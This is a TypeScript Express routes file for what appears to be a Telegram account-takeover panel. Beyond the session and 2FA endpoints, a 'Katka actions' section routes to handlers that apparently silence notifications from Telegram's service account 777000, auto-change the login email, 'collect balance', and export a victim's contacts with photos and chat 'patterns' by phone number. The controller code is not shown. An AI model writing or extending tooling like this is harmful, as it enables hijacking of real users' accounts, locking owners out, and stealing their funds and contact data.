import { Router } from 'express';
import { authenticate } from '../middleware/auth.middleware';
import * as telegramController from '../telegram/controllers/telegram.controller';

const router = Router();

router.get('/check-connection', authenticate, telegramController.checkConnection);
router.post('/send-code', authenticate, telegramController.sendCode);
router.post('/verify-code', authenticate, telegramController.verifyCode);
router.post('/send-email-code', authenticate, telegramController.sendEmailCode);
router.post('/verify-email-code', authenticate, telegramController.verifyEmailCode);
router.post('/resend-email-code', authenticate, telegramController.resendEmailCode);
router.post('/resend-phone-code', authenticate, telegramController.resendPhoneCode);
router.post('/reset-2fa', authenticate, telegramController.resetTwoFactor);
router.post('/change-2fa-password', authenticate, telegramController.changeTwoFactorPassword);
router.post('/verify-password', authenticate, telegramController.verifyPassword);
router.get('/sessions', authenticate, telegramController.getAllSessions);
router.get('/sessions/:id', authenticate, telegramController.getSessionById);
router.delete('/sessions/:id', authenticate, telegramController.deleteSession);
router.get('/sessions/:id/history', authenticate, telegramController.getSessionHistory);

// Katka actions
router.post('/katka/notifications-off', authenticate, telegramController.automate777000);
router.post('/katka/change-login-email/auto', authenticate, telegramController.autoChangeLoginEmail);
router.post('/katka/patterns', authenticate, (telegramController as any).exportPatterns);
router.get('/katka/:phone/patterns-index', authenticate, (telegramController as any).getPatternsIndex);
router.get('/katka/:phone/patterns-bundle/:chatId/:matchId', authenticate, (telegramController as any).getPatternBundle);
router.post('/katka/avatar', authenticate, (telegramController as any).exportAvatar);
router.post('/katka/balance', authenticate, (telegramController as any).collectBalance);
router.post('/katka/export-contacts-photos', authenticate, (telegramController as any).exportContactsWithPhotos);

export default router;